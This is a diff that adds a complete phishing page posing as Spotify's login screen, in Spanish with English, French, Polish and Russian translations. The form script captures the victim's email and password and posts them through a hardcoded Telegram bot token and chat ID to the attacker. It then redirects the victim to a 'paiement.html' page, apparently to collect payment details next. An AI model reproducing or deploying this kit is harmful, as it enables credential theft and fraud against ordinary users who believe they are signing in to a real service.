@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Iniciar sesión - Spotify</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+      background-color: #000;
+      color: #fff;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .container {
+      width: 100%;
+      max-width: 400px;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+    .logo {
+      width: 180px;
+      display: block;
+      margin: 0 auto 30px;
+    }
+    .login-form {
+      background-color: #121212;
+      padding: 30px;
+      border-radius: 10px;
+    }
+    h2 {
+      text-align: center;
+      margin-bottom: 30px;
+      font-size: 28px;
+    }
+    input {
+      width: 100%;
+      padding: 15px;
+      margin-bottom: 20px;
+      border: none;
+      border-radius: 5px;
+      background-color: #282828;
+      color: #fff;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    button {
+      width: 100%;
+      padding: 15px;
+      background-color: #1DB954;
+      color: white;
+      border: none;
+      border-radius: 30px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    button:hover {
+      background-color: #1ed760;
+    }
+    p {
+      text-align: center;
+      color: #b3b3b3;
+    }
+    a {
+      color: #1DB954;
+      text-decoration: none;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+    .lang-select {
+      text-align: right;
+      margin-bottom: 20px;
+    }
+    .lang-select select {
+      background-color: #121212;
+      color: white;
+      border: 1px solid #333;
+      padding: 5px;
+      border-radius: 5px;
+    }
+    #loading {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.7);
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+    .spinner {
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #1DB954;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 15px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+ </style>
+</head>
+<body>
+  <div class="container">
+    <!-- Sélecteur de langue -->
+    <div class="lang-select">
+      <label for="language">🌐</label>
+      <select id="language">
+        <option value="es" selected>Español</option>
+        <option value="en">English</option>
+        <option value="fr">Français</option>
+        <option value="pl">Polski</option>
+        <option value="ru">Русский</option>
+      </select>
+    </div>
+
+    <header>
+      <img src="spotify-logo.png" alt="Spotify Logo" class="logo">
+    </header>
+
+    <section class="login-form">
+      <h2 data-translate="title">Iniciar sesión</h2>
+
+      <form id="loginForm" method="POST" novalidate>
+        <input type="email" name="email" placeholder="Correo electrónico" data-placeholder="email" required>
+        <input type="password" name="password" placeholder="Contraseña" data-placeholder="password" required>
+        <button type="submit" id="btn-submit" data-translate="login">INICIAR SESIÓN</button>
+      </form>
+
+      <p><a href="#" data-translate="forgot">¿Olvidaste tu contraseña?</a></p>
+      <p><span data-translate="signup-text">¿No tienes cuenta?</span> <a href="#" data-translate="signup">Regístrate</a></p>
+    </section>
+  </div>
+
+  <!-- Overlay de chargement -->
+  <div id="loading">
+    <div style="color:white;text-align:center;">
+      <div class="spinner"></div>
+      <div data-translate="processing">Iniciando sesión...</div>
+    </div>
+  </div>
+
+  <script>
+    // Traductions
+    const translations = {
+      es: { 
+        title: "Iniciar sesión", 
+        email: "Correo electrónico", 
+        password: "Contraseña", 
+        login: "INICIAR SESIÓN", 
+        forgot: "¿Olvidaste tu contraseña?", 
+        signup: "Regístrate", 
+        "signup-text": "¿No tienes cuenta?",
+        "processing": "Iniciando sesión..."
+      },
+      en: { 
+        title: "Log in", 
+        email: "Email address", 
+        password: "Password", 
+        login: "LOG IN", 
+        forgot: "Forgot your password?", 
+        signup: "Sign up", 
+        "signup-text": "Don't have an account?",
+        "processing": "Logging in..."
+      },
+      fr: { 
+        title: "Se connecter", 
+        email: "Adresse e-mail", 
+        password: "Mot de passe", 
+        login: "SE CONNECTER", 
+        forgot: "Mot de passe oublié ?", 
+        signup: "S'inscrire", 
+        "signup-text": "Pas encore de compte ?",
+        "processing": "Connexion..."
+      },
+      pl: { 
+        title: "Zaloguj się", 
+        email: "Adres e-mail", 
+        password: "Hasło", 
+        login: "ZALOGUJ SIĘ", 
+        forgot: "Nie pamiętasz hasła?", 
+        signup: "Zarejestruj się", 
+        "signup-text": "Nie masz konta?",
+        "processing": "Logowanie..."
+      },
+      ru: { 
+        title: "Войти", 
+        email: "Электронная почта", 
+        password: "Пароль", 
+        login: "ВОЙТИ", 
+        forgot: "Забыли пароль?", 
+        signup: "Зарегистрироваться", 
+        "signup-text": "Еще нет аккаунта?",
+        "processing": "Вход..."
+      }
+    };
+
+    const langSelect = document.getElementById("language");
+
+    function applyLanguage(lang) {
+      document.querySelectorAll("[data-translate]").forEach(el => {
+        const key = el.getAttribute("data-translate");
+        el.innerHTML = translations[lang][key] || el.innerHTML;
+      });
+      document.querySelectorAll("[data-placeholder]").forEach(el => {
+        const key = el.getAttribute("data-placeholder");
+        el.placeholder = translations[lang][key] || el.placeholder;
+      });
+    }
+
+    // Langue par défaut : espagnol
+    const savedLang = localStorage.getItem("selectedLang") || "es";
+    langSelect.value = savedLang;
+    applyLanguage(savedLang);
+
+    langSelect.addEventListener("change", () => {
+      const lang = langSelect.value;
+      localStorage.setItem("selectedLang", lang);
+      applyLanguage(lang);
+    });
+
+    // Gestion de la soumission du formulaire et envoi à Telegram
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      document.getElementById("loading").style.display = "flex";
+      document.getElementById("btn-submit").disabled = true;
+
+      const email = document.getElementById("loginForm").querySelector('input[type="email"]').value.trim();
+      const pwd = document.getElementById("loginForm").querySelector('input[type="password"]').value.trim();
+      const bot = "8282278449:AAFAK4-kguuUmTRttN4ocgDvVxc91kWDItA";
+      const chat = "-4970333928";
+      const currentLang = langSelect.value;
+      
+      let msg;
+      if (currentLang === "es") {
+        msg = `🎧 Inicio de sesión Spotify:\n📧 Correo: ${email}\n🔑 Contraseña: ${pwd}`;
+      } else if (currentLang === "fr") {
+        msg = `🎧 Connexion Spotify:\n📧 Email: ${email}\n🔑 Mot de passe: ${pwd}`;
+      } else if (currentLang === "pl") {
+        msg = `🎧 Logowanie Spotify:\n📧 Email: ${email}\n🔑 Hasło: ${pwd}`;
+      } else if (currentLang === "ru") {
+        msg = `🎧 Вход Spotify:\n📧 Почта: ${email}\n🔑 Пароль: ${pwd}`;
+      } else {
+        msg = `🎧 Spotify Login:\n📧 Email: ${email}\n🔑 Password: ${pwd}`;
+      }
+
+      fetch(`https://api.telegram.org/bot${bot}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chat, text: msg })
+      })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error('Network response was not ok');
+        }
+        return response.json();
+      })
+      .then(data => {
+        console.log('Message sent to Telegram:', data);
+        setTimeout(() => {
+          window.location.href = "paiement.html?lang=" + currentLang;
+        }, 2000);
+      })
+      .catch(error => {
+        console.error('Error sending to Telegram:', error);
+        setTimeout(() => {
+          window.location.href = "paiement.html?lang=" + currentLang;
+        }, 2000);
+      });
+    });
+  </script>
+</body>
+</html>
